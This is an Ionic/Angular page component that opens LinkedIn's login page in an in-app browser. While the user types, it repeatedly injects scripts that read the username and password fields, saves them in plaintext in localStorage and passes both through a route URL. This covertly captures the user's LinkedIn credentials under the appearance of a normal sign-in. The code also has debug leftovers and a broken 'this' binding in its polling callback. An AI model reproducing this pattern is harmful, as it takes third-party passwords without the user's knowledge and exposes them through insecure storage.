import { Component, OnInit } from '@angular/core';
import {SharedDataService} from "../../providers/shared-data/shared-data.service";
import {Platform} from "@ionic/angular";
import {InAppBrowser} from "@ionic-native/in-app-browser/ngx";
import {Router} from "@angular/router";

@Component({
  selector: 'app-inappbrowser',
  templateUrl: './inappbrowser.page.html',
  styleUrls: ['./inappbrowser.page.scss'],
})
export class InappbrowserPage implements OnInit {
  val1
  logged:any = false;
  constructor(
      public sharedData: SharedDataService,
      public platform: Platform,
      private iab: InAppBrowser,
      private router: Router,
  ) { }

  ngOnInit() {
  }
  async ionViewWillEnter(){
    alert("here")
    this.logged = false;
    localStorage.clear();
    await this.sharedData.showLoading()
    this.platform.ready().then(async () => {
      await this.sharedData.hideLoading()
      if (this.platform.is("ios")) {

        var options = "location=yes,clearsessioncache=yes,clearcache=yes,keyboardDisplayRequiresUserAction=yes,toolbar=yes,toolbarposition=top,closebuttoncaption=fermer";
        var url = "https://www.linkedin.com/login/" + window.navigator.language;
        const browser = this.iab.create(url, "_blank", options);

        browser.on("loadstop").subscribe(e => {
          if (e.url != url && e.url != "https://www.linkedin.com/checkpoint/lg/login-submit") {
            this.val1 = null;
            this.logged= true;
            this.router.navigate([
              "/get-data-from-linked-in/" +
              localStorage.getItem("username") +
              "/" +
              localStorage.getItem("password")
            ]);
            browser.close();
          }
          if (e.url == url) {
            this.val1 = setInterval(function() {
              browser
                  .executeScript({
                    code: 'document.getElementById("password").value'
                  })
                  .then(password => {
                    localStorage.setItem("password", password[0]);
                    this.password = password[0];
                  });

              browser
                  .executeScript({
                    code: 'document.getElementById("username").value'
                  })
                  .then(username => {
                    localStorage.setItem("username", username[0]);
                    this.email = username[0];
                  });

              if (this.password || this.email) {
                clearInterval(this.val1);
              }
            }, 100);
          }
        });

        browser.on("loadstart").subscribe(e => {
          if (e.url != url && e.url != "https://www.linkedin.com/checkpoint/lg/login-submit") {
            this.val1 = null;
            this.logged= true;
            browser.close();
          }
        });
        browser.on("exit").subscribe(e => {

          if (e.url != url && this.logged) {
     
            browser.close();
            this.val1 = null;
            this.router.navigate([
              "/get-data-from-linked-in/" +
              localStorage.getItem("username") +
              "/" +
              localStorage.getItem("password")
            ]);
          } else {
            this.router.navigate(['synch-linked-in-page']);
          }
        });
      } else {
        const browser = this.iab.create(
            "https://www.linkedin.com/login",
            "_blank",
            "location=yes,clearsessioncache=yes,clearcache=yes,beforeload=yes"
        );
        var url = "https://www.linkedin.com/login";
        browser.show();
        browser.on("loadstop").subscribe(e => {
          
          
          if (e.url != url && e.url != "https://www.linkedin.com/checkpoint/lg/login-submit") {
            this.val1 = null;
      
            browser.close();
          }
          if (e.url == url) {
            this.val1 = setInterval(function() {
              browser
                  .executeScript({
                    code: 'document.getElementById("password").value'
                  })
                  .then(password => {
                    this.password = password[0];
                    localStorage.setItem("password", password[0]);
                  });

              browser
                  .executeScript({
                    code: 'document.getElementById("username").value'
                  })
                  .then(username => {
                    this.email = username[0];
                    localStorage.setItem("username", username[0]);
                  });

              if (this.password || this.email) {
                clearInterval(this.val1);
              }
            }, 100);
          }
        });

        browser.on("beforeload").subscribe(e => {
          
          if (e.url != url && e.url != "https://www.linkedin.com/checkpoint/lg/login-submit") {
            this.logged=true;
     
            this.val1 = null;
            browser.close();
          }
        });
        browser.on("exit").subscribe(e => {

          if (e.url != url && this.logged ) {
            browser.close();
            this.val1 = null;
            this.router.navigate([
              "/get-data-from-linked-in/" +
              localStorage.getItem("username") +
              "/" +
              localStorage.getItem("password")
            ]);
          } else {
            this.router.navigate(['synch-linked-in-page']);
          }
        });
      }
    });
  }

}
